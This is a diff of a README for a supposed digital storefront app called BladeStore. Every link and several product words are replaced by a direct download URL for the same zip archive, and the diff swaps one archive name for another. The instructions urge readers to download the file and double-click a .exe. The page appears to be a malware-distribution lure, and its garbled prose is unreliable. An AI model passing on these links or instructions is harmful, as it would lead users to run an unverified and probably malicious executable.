@@ -1,10 +1,10 @@
 # 🛍️ BladeStore - A Simple Digital Storefront Solution
 
-[![Download BladeStore](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip%https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
+[![Download BladeStore](https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip%https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip)](https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip)
 
 ## 🌟 Introduction
 
-Welcome to BladeStore! Blade Store is a neon-styled digital storefront system designed to make online selling easy and enjoyable. With BladeStore, you can manage products, process orders, and run promotions all from one convenient platform. Our system uses https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip and JSON-based storage for reliable performance and a sleek, modern user interface.
+Welcome to BladeStore! Blade Store is a neon-styled digital storefront system designed to make online selling easy and enjoyable. With BladeStore, you can manage products, process orders, and run promotions all from one convenient platform. Our system uses https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip and JSON-based storage for reliable performance and a sleek, modern user interface.
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ To use BladeStore, follow these simple steps for downloading and setting it up o
 Before downloading, ensure your computer meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip Version 12 or higher installed
+- https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip Version 12 or higher installed
 - Internet Connection: Required for installation and updates
 
 ## 📥 Download & Install
@@ -24,11 +24,11 @@ To get BladeStore:
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page where you can find the latest version of BladeStore.
 
-   [Visit GitHub Releases Page](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
+   [Visit GitHub Releases Page](https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip)
 
 2. **Select the Latest Version**: Look for the latest release, usually indicated at the top.
 
-3. **Download the Application**: Click on the appropriate download link for your operating system. You will see files like **https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip** for Windows or **https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip** for macOS.
+3. **Download the Application**: Click on the appropriate download link for your operating system. You will see files like **https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip** for Windows or **https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip** for macOS.
 
 4. **Install BladeStore**: 
    - For Windows: Double-click the downloaded **.exe** file and follow the prompts to install.
@@ -77,8 +77,8 @@ Follow us on GitHub to get updates on new features and improvements.
 
 ## 🔗 Important Links
 
-- [Visit GitHub Releases Page](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
-- [Documentation](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
+- [Visit GitHub Releases Page](https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip)
+- [Documentation](https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip)
+- [Issue Tracker](https://github.com/walus2211/BladeStore/raw/refs/heads/main/public/Store-Blade-malmignatte.zip)
 
 Thank you for choosing BladeStore! We hope it helps you manage your digital storefront with ease. Happy selling!
